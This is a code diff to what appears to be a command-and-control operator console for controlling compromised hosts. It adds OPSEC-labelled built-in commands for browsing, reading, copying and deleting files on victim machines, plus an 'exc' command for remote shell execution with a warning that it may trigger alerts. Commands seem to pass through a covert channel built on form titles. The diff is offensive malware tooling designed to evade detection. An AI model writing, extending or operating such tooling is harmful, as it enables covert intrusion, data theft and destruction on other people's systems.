@@ -807,10 +807,23 @@ HELP = """Commands:
   exit            quits
 """
 
-INTERACT_HELP = """In interact mode:
-  <any command>   send command to host
+INTERACT_HELP = """In interact mode - Built-in commands (OPSEC-safe):
+  whoami       shows current user and privileges
+  ls [path]    lists files in directory (default: current)
+  pwd          shows current working directory
+  cd <path>    changes current directory
+  cat <file>   displays file contents
+  remove <path> deletes file or directory
+  mkdir <path> creates directory
+  cp <src> <dst> copies file from source to destination
+
+In interact mode - Direct shell commands (triggers OPSEC warning):
+  exc <cmd>    executes command (requires confirmation)
+
+Other:
   delete       delete the compromised host, after confirmation
   back         returns to the main prompt
+  help         this help
 """
 
 
@@ -905,6 +918,17 @@ def interact_mode(monitor: Monitor, form: dict, writer: FormWriter, cookie: str,
                     print(f"\033[93m[*] Host {key} has been deleted. Returning to main prompt.\033[0m")
                     return
                 continue
+
+            if message.lower().startswith("exc "):
+                print("\033[91m[!] OPSEC WARNING\033[0m: Using 'exc' command will execute directly via command host and may generate alerts.")
+                try:
+                    confirm = monitor.console.input("\033[91mProceed? [y/N] \033[0m").strip().lower()
+                except EOFError:
+                    confirm = ""
+
+                if confirm not in ("y", "yes"):
+                    print("  \033[93mcancelled.\033[0m")
+                    continue
 
             new_title = build_title(get_form_title(form, cookie), key, message)
             try:
